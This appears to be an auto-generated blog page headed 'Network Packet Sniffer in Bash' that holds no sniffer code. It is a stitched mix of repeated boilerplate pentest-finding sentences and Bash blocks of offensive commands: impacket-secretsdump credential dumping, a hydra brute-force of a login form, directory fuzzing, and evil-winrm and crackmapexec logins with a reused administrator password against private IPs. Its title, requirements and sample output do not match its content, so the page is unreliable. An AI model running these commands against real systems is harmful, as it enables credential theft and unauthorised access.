---
TitleSEO: "Network Packet Sniffer in Bash | ZureFX"
TitlePost: "Network Packet Sniffer — Bash"
Author: "ZureFX"
Description: "A Bash script for network packet sniffer. Built for security research and automation."
Keywords: "python, c, parser, powershell, tool, bash"
URL: "https://zurefx.github.io/scripting/script-network-packet-sniffer-867.html"
URL_IMAGES: ""
Date: "2024-10-03"
Tags: "Python, C, Parser, PowerShell, Tool, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-network-packet-sniffer-867"
Permalink: "/scripting/script-network-packet-sniffer-867.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Authentication bypass was achieved through careful manipulation of the login mechanism. Authentication bypass was achieved through careful manipulation of the login mechanism. The web application was vulnerable to Server-Side Template Injection (SSTI).

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `atexec`
- `metasploit`
- `smbexec`

## Implementation

### Core Logic

The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.63.123.134
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.33.144.230/FUZZ
```

Lateral movement was facilitated by reusing discovered credentials across services. The database credentials were hardcoded in the application source code.

### Helper Functions

Unconstrained delegation was enabled on the compromised machine. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.49.103.229 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
impacket-secretsdump administrator:'P@ssw0rd!'@10.26.7.94
```

## Usage

### Basic Usage

Command injection was possible through unsanitized user input in the search functionality. The database credentials were hardcoded in the application source code.

```bash
gobuster dir -u http://10.119.121.12/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.19.245.185
gobuster dir -u http://10.83.90.59/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

### Advanced Options

The web application was vulnerable to Server-Side Template Injection (SSTI). The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
evil-winrm -i 10.30.83.60 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.35.238.223
crackmapexec smb 10.33.60.93 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

Lateral movement was facilitated by reusing discovered credentials across services. The scheduled task ran with elevated privileges and could be abused for escalation.

```
[+] Scanning target...
[+] Found 17 results
[+] Done in 7.73s
```
